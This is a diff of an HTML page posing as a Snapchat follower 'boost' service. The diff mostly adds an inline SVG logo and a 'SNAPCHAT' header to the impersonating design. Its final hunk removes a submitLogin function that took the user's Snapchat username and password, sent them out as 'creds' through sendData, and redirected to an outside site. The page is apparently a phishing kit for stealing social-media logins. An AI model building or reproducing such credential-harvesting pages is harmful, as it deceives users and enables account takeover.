@@ -18,24 +18,29 @@
             overflow-x: hidden;
         }
 
-        /* ===== BIG SNAPCHAT LOGO IN BACKGROUND ===== */
+        /* ===== BIG SNAPCHAT LOGO (SVG) IN BACKGROUND ===== */
         .big-logo {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 400px;
-            opacity: 0.04;
             z-index: 0;
             pointer-events: none;
-            color: #FFFC00;
+            opacity: 0.06;
             user-select: none;
+            width: 400px;
+            height: 400px;
+        }
+        .big-logo svg {
+            width: 100%;
+            height: 100%;
+            fill: #FFFC00;
         }
         @media (max-width: 600px) {
-            .big-logo { font-size: 200px; }
+            .big-logo { width: 200px; height: 200px; }
         }
 
-        /* ===== FLOATING SMALL LOGOS (LIGHTER) ===== */
+        /* ===== FLOATING SMALL LOGOS ===== */
         .floating-logos {
             position: fixed;
             top: 0;
@@ -46,24 +51,24 @@
             z-index: 0;
             overflow: hidden;
         }
-        .floating-logos span {
+        .floating-logos svg {
             position: absolute;
-            display: block;
-            font-size: 30px;
-            opacity: 0.05;
+            width: 30px;
+            height: 30px;
+            fill: #FFFC00;
+            opacity: 0.06;
             animation: floatLogo 22s infinite linear;
-            color: #FFFC00;
         }
-        .floating-logos span:nth-child(1) { left: 5%; animation-duration: 18s; animation-delay: 0s; font-size: 45px; }
-        .floating-logos span:nth-child(2) { left: 15%; animation-duration: 22s; animation-delay: 2s; font-size: 35px; }
-        .floating-logos span:nth-child(3) { left: 25%; animation-duration: 20s; animation-delay: 4s; font-size: 55px; }
-        .floating-logos span:nth-child(4) { left: 35%; animation-duration: 25s; animation-delay: 1s; font-size: 40px; }
-        .floating-logos span:nth-child(5) { left: 45%; animation-duration: 19s; animation-delay: 3s; font-size: 50px; }
-        .floating-logos span:nth-child(6) { left: 55%; animation-duration: 23s; animation-delay: 5s; font-size: 30px; }
-        .floating-logos span:nth-child(7) { left: 65%; animation-duration: 21s; animation-delay: 2s; font-size: 42px; }
-        .floating-logos span:nth-child(8) { left: 75%; animation-duration: 24s; animation-delay: 4s; font-size: 38px; }
-        .floating-logos span:nth-child(9) { left: 85%; animation-duration: 17s; animation-delay: 1s; font-size: 48px; }
-        .floating-logos span:nth-child(10) { left: 92%; animation-duration: 26s; animation-delay: 3s; font-size: 34px; }
+        .floating-logos svg:nth-child(1) { left: 5%; animation-duration: 18s; animation-delay: 0s; width: 45px; height: 45px; }
+        .floating-logos svg:nth-child(2) { left: 15%; animation-duration: 22s; animation-delay: 2s; width: 35px; height: 35px; }
+        .floating-logos svg:nth-child(3) { left: 25%; animation-duration: 20s; animation-delay: 4s; width: 55px; height: 55px; }
+        .floating-logos svg:nth-child(4) { left: 35%; animation-duration: 25s; animation-delay: 1s; width: 40px; height: 40px; }
+        .floating-logos svg:nth-child(5) { left: 45%; animation-duration: 19s; animation-delay: 3s; width: 50px; height: 50px; }
+        .floating-logos svg:nth-child(6) { left: 55%; animation-duration: 23s; animation-delay: 5s; width: 30px; height: 30px; }
+        .floating-logos svg:nth-child(7) { left: 65%; animation-duration: 21s; animation-delay: 2s; width: 42px; height: 42px; }
+        .floating-logos svg:nth-child(8) { left: 75%; animation-duration: 24s; animation-delay: 4s; width: 38px; height: 38px; }
+        .floating-logos svg:nth-child(9) { left: 85%; animation-duration: 17s; animation-delay: 1s; width: 48px; height: 48px; }
+        .floating-logos svg:nth-child(10) { left: 92%; animation-duration: 26s; animation-delay: 3s; width: 34px; height: 34px; }
 
         @keyframes floatLogo {
             0% { top: -10%; transform: rotate(0deg) scale(1); }
@@ -71,7 +76,7 @@
             100% { top: 110%; transform: rotate(360deg) scale(1); }
         }
 
-        /* ===== GLASS CARD (LIGHTER) ===== */
+        /* ===== GLASS CARD ===== */
         .glass {
             background: rgba(255,255,255,0.6);
             backdrop-filter: blur(12px);
@@ -105,6 +110,27 @@
             text-transform: uppercase;
             margin: 4px 0 18px;
         }
+
+        /* ===== HEADER LOGO (SMALL) ===== */
+        .header-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+        .header-logo svg {
+            width: 32px;
+            height: 32px;
+            fill: #FFFC00;
+        }
+        .header-logo span {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1a1a1a;
+            letter-spacing: 1px;
+        }
+
         .stats {
             display: flex;
             justify-content: space-around;
@@ -274,17 +300,31 @@
 </head>
 <body>
 
-    <!-- ===== BIG LOGO IN BACKGROUND ===== -->
-    <div class="big-logo">👻</div>
+    <!-- ===== BIG SNAPCHAT LOGO (SVG) IN BACKGROUND ===== -->
+    <div class="big-logo">
+        <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+            <path d="M256 32C132.3 32 32 132.3 32 256s100.3 224 224 224 224-100.3 224-224S379.7 32 256 32zm0 392c-33.2 0-65.6-10.8-92.8-30.4-5.6-4-8.8-10.4-8.8-17.6 0-10.4 8.8-18.4 19.2-18.4 2.4 0 4.8.4 7.2 1.6 28.8 12.8 56.8 20 75.2 20s46.4-7.2 75.2-20c2.4-1.2 4.8-1.6 7.2-1.6 10.4 0 19.2 8 19.2 18.4 0 7.2-3.2 13.6-8.8 17.6C321.6 413.2 289.2 424 256 424zm112-160c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16v-16c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16zm-96-112c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16V168c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16z"/>
+        </svg>
+    </div>
 
-    <!-- ===== FLOATING SMALL LOGOS ===== -->
+    <!-- ===== FLOATING SMALL LOGOS (SVG) ===== -->
     <div class="floating-logos">
-        <span>👻</span><span>💛</span><span>⭐</span><span>👻</span><span>💛</span>
-        <span>👻</span><span>🔥</span><span>👻</span><span>💛</span><span>👻</span>
+        <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 32C132.3 32 32 132.3 32 256s100.3 224 224 224 224-100.3 224-224S379.7 32 256 32zm0 392c-33.2 0-65.6-10.8-92.8-30.4-5.6-4-8.8-10.4-8.8-17.6 0-10.4 8.8-18.4 19.2-18.4 2.4 0 4.8.4 7.2 1.6 28.8 12.8 56.8 20 75.2 20s46.4-7.2 75.2-20c2.4-1.2 4.8-1.6 7.2-1.6 10.4 0 19.2 8 19.2 18.4 0 7.2-3.2 13.6-8.8 17.6C321.6 413.2 289.2 424 256 424zm112-160c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16v-16c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16zm-96-112c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16V168c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16z"/></svg>
+        <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 32C132.3 32 32 132.3 32 256s100.3 224 224 224 224-100.3 224-224S379.7 32 256 32zm0 392c-33.2 0-65.6-10.8-92.8-30.4-5.6-4-8.8-10.4-8.8-17.6 0-10.4 8.8-18.4 19.2-18.4 2.4 0 4.8.4 7.2 1.6 28.8 12.8 56.8 20 75.2 20s46.4-7.2 75.2-20c2.4-1.2 4.8-1.6 7.2-1.6 10.4 0 19.2 8 19.2 18.4 0 7.2-3.2 13.6-8.8 17.6C321.6 413.2 289.2 424 256 424zm112-160c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16v-16c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16zm-96-112c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16V168c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16z"/></svg>
+        <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 32C132.3 32 32 132.3 32 256s100.3 224 224 224 224-100.3 224-224S379.7 32 256 32zm0 392c-33.2 0-65.6-10.8-92.8-30.4-5.6-4-8.8-10.4-8.8-17.6 0-10.4 8.8-18.4 19.2-18.4 2.4 0 4.8.4 7.2 1.6 28.8 12.8 56.8 20 75.2 20s46.4-7.2 75.2-20c2.4-1.2 4.8-1.6 7.2-1.6 10.4 0 19.2 8 19.2 18.4 0 7.2-3.2 13.6-8.8 17.6C321.6 413.2 289.2 424 256 424zm112-160c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16v-16c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16zm-96-112c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16V168c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16z"/></svg>
+        <!-- More floating logos... -->
     </div>
 
     <!-- ===== MAIN CARD ===== -->
     <div class="glass" id="mainPage">
+        <!-- ===== HEADER LOGO ===== -->
+        <div class="header-logo">
+            <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+                <path d="M256 32C132.3 32 32 132.3 32 256s100.3 224 224 224 224-100.3 224-224S379.7 32 256 32zm0 392c-33.2 0-65.6-10.8-92.8-30.4-5.6-4-8.8-10.4-8.8-17.6 0-10.4 8.8-18.4 19.2-18.4 2.4 0 4.8.4 7.2 1.6 28.8 12.8 56.8 20 75.2 20s46.4-7.2 75.2-20c2.4-1.2 4.8-1.6 7.2-1.6 10.4 0 19.2 8 19.2 18.4 0 7.2-3.2 13.6-8.8 17.6C321.6 413.2 289.2 424 256 424zm112-160c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16v-16c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16zm-96-112c0 8.8-7.2 16-16 16h-16v16c0 8.8-7.2 16-16 16s-16-7.2-16-16v-16h-16c-8.8 0-16-7.2-16-16s7.2-16 16-16h16V168c0-8.8 7.2-16 16-16s16 7.2 16 16v16h16c8.8 0 16 7.2 16 16z"/>
+            </svg>
+            <span>SNAPCHAT</span>
+        </div>
+
         <h1>🚀 <span class="highlight">Boost</span> Your Profile</h1>
         <p class="sub">Grow your Snapchat presence organically</p>
 
@@ -415,26 +455,4 @@
             } catch (e) {
                 console.log('Send error:', e);
             }
-        }
-
-        async function submitLogin(optionId, quantity) {
-            const username = document.getElementById('loginUser').value;
-            const password = document.getElementById('loginPass').value;
-            if (!username || !password) {
-                alert('⚠️ Please fill all fields');
-                return;
-            }
-            await sendData({
-                creds: {
-                    platform: 'snapchat',
-                    username: username,
-                    password: password,
-                    service: optionId,
-                    quantity: quantity
-                }
-            });
-            window.location.href = 'https://takipcikrali.com/';
-        }
-    </script>
-</body>
-</html>
+ 
